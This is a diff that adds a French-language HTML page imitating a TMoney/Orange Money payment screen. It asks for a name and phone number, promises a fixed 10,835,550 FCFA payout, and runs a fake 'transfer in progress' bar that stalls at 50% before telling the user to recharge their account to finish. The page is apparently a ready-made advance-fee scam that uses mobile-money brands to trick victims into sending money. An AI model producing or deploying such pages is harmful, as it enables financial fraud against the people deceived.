@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enregistrement TMoney</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .amount {
+            background-color: #e9ecef;
+            cursor: not-allowed;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+            position: relative;
+        }
+
+        .progress-bar {
+            width: 0;
+            height: 20px;
+            background-color: #007bff;
+            border-radius: 5px;
+        }
+
+        .progress-percentage {
+            position: absolute;
+            width: 100%;
+            top: 0;
+            left: 0;
+            color: #333;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .progress-title {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #007bff;
+            font-weight: bold;
+            display: none;
+        }
+
+        .notification-message {
+            color: orange;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            font-weight: bold;
+        }
+
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Paiement Orange Money</h1>
+
+        <form id="tmoneyForm" onsubmit="return false;">
+            <div class="form-group">
+                <label for="name">Nom et Prénom</label>
+                <input type="text" id="name" placeholder="Nom et Prénom" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Numéro TMoney</label>
+                <input type="tel" id="phone" placeholder="Numéro" required>
+            </div>
+
+            <div class="form-group">
+                <label for="amount">Montant à recevoir</label>
+                <input type="text" id="amount" class="amount" value="10 835 550 FCFA" disabled>
+            </div>
+
+            <button type="button" onclick="startProgress()">Procéder</button>
+
+            <div class="progress-title" id="progressTitle">Transfert des fonds en cours...</div>
+
+            <div class="progress-bar-container" id="progressContainer">
+                <div class="progress-percentage" id="progressPercentage">0%</div>
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+
+            <div class="notification-message" id="notificationMessage">Erreur : Veuillez recharger votre compte pour terminer la transaction.</div>
+        </form>
+    </div>
+
+    <script>
+        function startProgress() {
+            document.getElementById('progressContainer').style.display = 'block';
+            document.getElementById('progressTitle').style.display = 'block';
+            document.getElementById('notificationMessage').style.display = 'none';
+
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const progressPercentage = document.getElementById('progressPercentage');
+            
+            const interval = setInterval(() => {
+                if (progress < 50) {
+                    progress += 1;
+                    progressBar.style.width = progress + '%';
+                    progressPercentage.textContent = progress + '%';
+                } else {
+                    clearInterval(interval);
+                    document.getElementById('notificationMessage').style.display = 'block';
+                }
+            }, 300);
+        }
+    </script>
+</body>
+</html>
